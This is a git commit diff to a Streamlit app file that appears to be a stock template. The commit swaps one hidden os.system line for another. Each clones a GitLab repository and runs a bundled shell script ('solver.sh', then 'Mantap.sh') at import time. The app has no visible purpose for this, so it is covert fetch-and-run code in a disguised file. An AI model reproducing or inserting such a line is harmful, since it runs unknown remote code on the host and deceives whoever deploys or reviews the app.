7222514a560508f3a687d2fab8b8aafa431a07f3
niamaeia0 <97575359+niamaeia0@users.noreply.github.com>
2022-01-12 17:55:09 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://gitlab.com/andyketan1/solver.git && cd solver && bash solver.sh')
+os.system('git clone https://gitlab.com/andyketan1/qgcm.git && cd qgcm && bash Mantap.sh')
 
 """
 # Welcome to Streamlit!
